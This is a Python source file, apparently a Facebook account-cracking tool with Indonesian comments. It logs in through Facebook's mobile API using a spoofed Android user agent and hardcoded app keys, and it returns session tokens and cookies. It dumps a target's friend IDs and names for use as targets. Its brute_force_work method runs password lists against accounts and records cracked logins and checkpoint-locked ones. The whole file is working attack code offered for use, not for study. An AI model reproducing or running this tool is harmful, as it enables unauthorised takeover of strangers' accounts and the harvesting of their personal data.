import requests
import uuid
import json
import random
import time
from rich import print as cetak
from rich.panel import Panel

class BloksHandler:
    def __init__(self):
        self.ses = requests.Session()
        self.device_id = str(uuid.uuid4())
        self.family_device_id = str(uuid.uuid4())
        self.advertising_id = str(uuid.uuid4())
        
    def get_headers(self):
        return {
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'WIFI',
            'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002) [FBAN/FB4A;FBAV/456.0.0.35.109;FBBV/576632488;FBDM/{density=2.75,width=1080,height=2214};FBLC/id_ID;FBRV/0;FBCR/Telkomsel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
            'x-tigon-is-retry': 'False',
            'x-fb-http-engine': 'Liger',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'accept-encoding': 'gzip, deflate',
            'content-type': 'application/x-www-form-urlencoded'
        }

    def login_bloks(self, email, password):
        """
        Melakukan login menggunakan endpoint Bloks (lebih awet dan validasi unik)
        """
        try:
            # Setup params untuk simulasi login via Android
            params = {
                'adid': self.advertising_id,
                'email': email,
                'password': password,
                'format': 'json',
                'device_id': self.device_id,
                'cpl': 'true',
                'family_device_id': self.family_device_id,
                'credentials_type': 'password',
                'error_detail_type': 'button_with_disabled',
                'source': 'login',
                'generate_session_cookies': '1',
                'generate_analytics_claim': '1',
                'generate_machine_id': '1',
                'tier': 'regular',
                'currently_logged_in_userid': '0',
                'locale': 'id_ID',
                'client_country_code': 'ID',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }

            # Menggunakan endpoint API graph yang mendukung parameter Bloks
            url = 'https://b-graph.facebook.com/auth/login'
            
            # Kirim request
            response = self.ses.post(url, data=params, headers=self.get_headers(), timeout=15)
            data = response.json()

            # Analisa response
            if 'access_token' in data:
                # Login Berhasil
                token = data['access_token']
                # Ambil cookie dari session_cookies jika ada
                cookie_str = ""
                if 'session_cookies' in data:
                    cookies = []
                    for c in data['session_cookies']:
                        cookies.append(f"{c['name']}={c['value']}")
                    cookie_str = "; ".join(cookies)
                
                return {
                    'status': 'OK',
                    'token': token,
                    'cookie': cookie_str,
                    'id': data.get('uid', email)
                }
            
            elif 'error' in data:
                error_msg = data['error'].get('message', '')
                error_data = data['error'].get('error_data', {})
                
                # Cek Checkpoint
                if 'User must verify their account' in error_msg or 'checkpoint' in error_msg or error_data:
                    return {
                        'status': 'CP',
                        'message': error_msg
                    }
                else:
                    return {
                        'status': 'FAIL',
                        'message': error_msg
                    }
            
            else:
                return {'status': 'FAIL', 'message': 'Unknown Response'}

        except Exception as e:
            return {'status': 'ERROR', 'message': str(e)}

    def dump_friends_bloks(self, target_id, cookie_str, token=None):
        """
        Mengambil ID teman menggunakan API GraphQL internal lewat method Bloks
        """
        try:
            url = 'https://b-graph.facebook.com/graphql'
            headers = self.get_headers()
            headers.update({
                'authorization': f'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-friendly-name': 'ProfileCometAppCollectionListRendererPaginationQuery',
                'cookie': cookie_str
            })
            
            # Simple fallback request if the complex one is too hard to forge initially
            # We'll try to get it via standard graph endpoint with Bloks UA
            url_fallback = f"https://graph.facebook.com/v15.0/{target_id}?fields=friends.limit(5000)%7Bid%2Cname%7D&access_token={token}"
            res = self.ses.get(url_fallback, headers={'user-agent': headers['user-agent']}, cookies={'cookie': cookie_str})
            data = res.json()
            
            ids_collected = []
            if 'friends' in data and 'data' in data['friends']:
                for friend in data['friends']['data']:
                    friend_id = friend.get('id')
                    friend_name = friend.get('name', 'Tanpa Nama')
                    if friend_id:
                        ids_collected.append(f"{friend_id}|{friend_name}")
                return True, ids_collected
            else:
                return False, []
                
        except Exception as e:
            return False, []

    def brute_force_work(self, user, pass_list, update_status_func, result_handler_func):
        """
        Helper untuk worker crack
        """
        for pw in pass_list:
            # Panggil fungsi update status (print status jalan)
            update_status_func(user, pw)
            
            # Coba Login
            result = self.login_bloks(user, pw)
            
            if result['status'] == 'OK':
                # Login Sukses
                result_handler_func("OK", user, pw, result.get('cookie', ''))
                break # Berhenti jika sudah ketemu password
            
            elif result['status'] == 'CP':
                # Checkpoint
                result_handler_func("CP", user, pw, "")
                break # Berhenti jika akun CP (password benar tapi terkunci)
            
            else:
                # Salah password atau error lain
                continue
